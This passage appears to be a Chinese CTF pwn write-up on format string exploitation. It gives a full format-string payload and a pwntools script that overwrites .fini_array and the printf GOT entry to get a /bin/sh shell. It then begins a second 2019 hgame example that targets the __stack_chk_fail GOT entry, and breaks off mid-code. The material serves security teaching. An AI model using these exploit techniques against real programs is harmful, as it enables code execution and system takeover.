‘0x20804’
因为最后的 payload 为：
x9cx97x04x08x9ex97x04x08x9cx98x04x08x9ex98x04x08%34084c%4$hn%33488c%5$hn%31692c%6$hn%33844c%7$hn
计算一下最后 len(payload) = 64，这也就是出题人设计 scanf 输入个数为 64 的原因。
**exp**
    from pwn import *
    r = process("./pwn")
    elf = ELF("./pwn")
    print_got = elf.got['printf']
    r.recvuntil("Welcome to my ctf! What's your name?")
    fini_func = 0x0804979C
    system_plt = 0x080483D0
    main_addr = 0x08048534
    #payload1 = fmtstr_payload(4,{fini_func:main_addr},word_size='short')
    #payload2 = fmtstr_payload(4,{print_got:system_plt},word_size='short')
    payload = "x9cx97x04x08x9ex97x04x08x9cx98x04x08x9ex98x04x08%34084c%4$hn%33488c%5$hn%31692c%6$hn%33844c%7$hn"
    r.send(payload)
    r.recv()
    r.sendline('/bin/shx00')
###  例题 2
这道题是 2019 hgame 的一道 pwn 题。payload 的构造比较巧妙，通过覆盖 ___stack_chk_fail 函数的 got
表指针为后门函数地址来达到目的。
题目的逻辑很简单。
main 函数：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char format; // [rsp+0h] [rbp-60h]
      unsigned __int64 v5; // [rsp+58h] [rbp-8h]
      v5 = __readfsqword(0x28u);                    // canary
      init();
      read_n(&format, 0x58u);
      printf(&format);                              // printf(&format)
      return 0;
    }
read_n 函数：
    __int64 __fastcall read_n(__int64 str, unsigned int len)
    {
      __int64 result; // rax
      signed int i; // [rsp+1Ch] [rbp-4h]
      for ( i = 0; ; ++i )
      {
        result = i;
        if ( i > len )
          break;
        if ( read(0, (i + str), 1uLL)   